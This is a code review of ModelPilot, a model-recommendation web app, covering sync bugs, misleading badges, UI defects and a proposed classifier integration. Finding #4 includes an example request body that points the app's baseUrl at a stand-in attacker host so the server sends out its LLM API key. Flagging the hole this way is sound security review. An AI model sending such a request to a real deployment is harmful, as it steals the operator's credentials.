# ModelPilot — Code Review (2026-09-19)

Review only; no code was changed. Checks run: typecheck **passes**, `npm test` **passes (606/606)**, `eslint src` **fails (16 errors, 37 warnings)**: mostly setState inside an effect (`react-hooks/set-state-in-effect`), plus `no-explicit-any` and unescaped quotes.
Visual findings come from reading the code; no screenshots were taken.

---

## Critical bugs

### 1. "Pull Live Models" makes recommendations wrong
`src/app/api/models/live/route.ts:470-500` matches any OpenRouter model ID containing `opus`, `sonnet`, `haiku` or `gemini` + `flash`/`pro`. Today that imports **32 models**, including Claude 3 Haiku, Opus 4 ($15/$75) and Gemini 2.5 Flash Lite. All of them are switched on, and each family gets the same hard-coded capability scores, so Opus 4.0 rates 9.9 architecture, the same as Opus 5.

Result of running the engine on the live-synced catalog:

| Priority | Task | Picked |
|---|---|---|
| balanced | Rename a variable across three files | Gemini 2.5 Flash Lite |
| lowest_cost | Security audit of auth system | **Gemini 2.5 Pro** |
| balanced | Dashboard component | Sonnet 5, with *Gemini 2.5 Pro* as the "higher reliability" option |

### 2. The sync creates duplicate models
OpenRouter IDs use dots (`gemini-3.1-pro-preview`, `claude-haiku-4.5`) while the catalog uses hyphens (`gemini-3-1-pro-preview`, `claude-haiku-4-5`), so the same model appears twice. The matching heuristic in `src/components/models/catalog-editor.tsx:329` treats any `3.7` as equal to any `3-7`. Syncing also overwrites capability scores the user edited.

### 3. The sync reports success when it fails
If the OpenRouter fetch fails, `route.ts:677` still returns `success: true` with every default model marked `isLiveSynced: true`. The UI then says "Successfully synced N models with live pricing".

### 4. The server's LLM key can be sent to any URL
`src/lib/analyzer/classifier.ts:301`: the client supplies `baseUrl`, and when it sends no `apiKey` the server falls back to `process.env.LLM_API_KEY`. Posting `{ apiConfig: { baseUrl: "https://attacker" } }` sends the server key to that host. This matters if the app is deployed with `LLM_API_KEY` set. The LLM fetch also has no timeout.

### 5. The LLM classifier fails without telling you
The defaults are `https://api.openai.com/v1` with the model `gemini-2.5-flash`, so a plain OpenAI key gets an error and the app quietly falls back to keyword matching. The API returns `source` (`llm` / `fallback`), but `src/app/page.tsx` never displays it.

---

## Functional bugs

- **Feedback carries over to the next task.** `RecommendationCard` has no `key` (`page.tsx:217`), so running a new analysis without pressing Reset keeps the previous rating and the "Evaluation recorded locally" state.
- **Feedback records a rating you didn't give.** Clicking an outcome auto-saves `recommendationQuality: "about_right"`, which skews Analytics. The `comment` state is saved but no input is ever rendered.
- **The card shows the wrong price.** `recommendation-card.tsx:39` looks up `DEFAULT_MODELS` instead of the user's catalog, so edited or synced models show fallback prices and a made-up "1M" context. The savings figure is always measured against a hard-coded Opus price of $5/$25.
- **The higher-reliability option can go missing** (`engine.ts:570`). `.find()` can return the same model at `VERY_HIGH` effort, which is then discarded, even when another model would qualify.
- **The no-match fallback ignores the security rule** (`engine.ts:523`). It picks the highest-reasoning model regardless of the security rule (budget models can be chosen for security tasks). Confidence is not lowered, and certainty stays "clear". The effort chosen is `supportedEfforts[length-1]`, which assumes the list is sorted, but the catalog editor can leave it out of order.
- **Confidence ignores useful signals.** It ignores whether the classifier was the LLM or the keyword fallback, and whether the fallback path was taken; it mostly reflects text length.
- **Dead code in the engine:**
  - `determineEffortLevel` (scoring.ts) is never called.
  - `modelTierRank` / `requiredMviRank` are unused.
  - The context-window check (`< 100k`) can never trigger, because every model has 200k or more.
  - `toolDemand` / the agentic capability never influence which model is chosen.
- **Catalog editor limitations:**
  - A price of $0 can't be saved (`Number(0) || old`).
  - Capabilities aren't editable, although the README says they are.
  - Models can't be added or deleted.
  - The edit panel renders below the table without scrolling into view.
- **Presets can leave contradictory context.** Presets don't clear `newProject`, so Greenfield + Existing codebase can both end up on.
- **The API accepts unchecked input.** `/api/analyze` accepts `customModels` and `priority` without validating them.
- `/api/calibration/run` imports the browser-only `getStoredModels` (unused).

---

## Visual and trust issues

- **Light mode is broken on Settings and Calibration Lab.** They use dark-only classes (`text-zinc-100`, `bg-zinc-900/40`, `border-zinc-800`, with no `dark:` variants), so text will be unreadable in light mode.
- **Several badges are hard-coded and misleading:**
  - "606/606 Calibrated" in the navbar, home header and footer.
  - "100% Calibrated (30/30 Golden Tasks)" in Settings, but the suite actually runs 45.
  - "Sub-millisecond Local Engine" in the header, yet the LLM path takes seconds.
- **Strategy cards name old models** ("Claude 3 Opus or o1", "Claude 3.5 Sonnet") no matter what was recommended.
- **The CLI flag button only knows two tools:** anything that isn't Anthropic gets `gemini --model`. There is no OpenAI case.
- **Other small issues:**
  - The shortcut hint shows "⌘ Enter" on Windows.
  - The theme toggle's hover colours are dark-only.
  - There are many unused imports.

---

## How Jev would fit in (TypeSafe; suggestion only)

**Current flow:** task text → classifier (LLM JSON or keyword matching) → 8 task scores (`TaskProfile`) → the deterministic engine picks among enabled models.

**What I'd recommend: Jev replaces the classifier, and code keeps choosing the model.** This follows TypeSafe's composite-scoring and confidence-gated routing patterns.

- **One `systemOne` call** (`jev-latest`, `@typesafe-ai/sdk`, key in `TYPESAFE_API_KEY`, server-side only) asks everything at once:
  - 8 **Score** questions (complexity, ambiguity, consequence, novelty, context demand, scope, tool demand, verifiability), each with concrete level descriptions.
  - **Yes/no (Noul)** questions for security-sensitive and architecture-changing.
  - A **Choice** for the task type.
- **Jev's confidence feeds the confidence badge.** Low confidence on a high-risk task would move to the higher-reliability option or ask for clarification.
- **For close calls** (`certainty === "close_call"`), a second Jev **Choice** between the top 2–3 eligible models breaks the tie.
- **The keyword classifier stays as the offline fallback.**

**Needed first, whichever way you go:**

1. Fix live sync:
   - Allowlist exact current models.
   - Normalise dotted and hyphenated IDs.
   - Stop giving the same hard-coded scores to old models.
2. Add OpenAI (ChatGPT) models to the catalog and to live sync (OpenRouter lists ~91 `openai/` models, so filter tightly), plus a ChatGPT filter tab and a CLI-flag case.
3. Keep the per-model Active toggle and add on/off switches per provider (Gemini / Claude / ChatGPT).
4. Fix the key leak (#4) before adding a third API key.

### Open questions

1. **Recommend or run?** Should the app only recommend a model, or actually send the task to the chosen Gemini/Claude/ChatGPT model? Running it needs three provider keys and streaming output.
2. **Who decides?** Should Jev pick the model directly from the enabled list, or supply the judgments while the engine decides (recommended; easier to explain and to test with the existing 606 tests)?
3. **Offline fallback:** should it keep working with no TypeSafe key, using keyword matching?
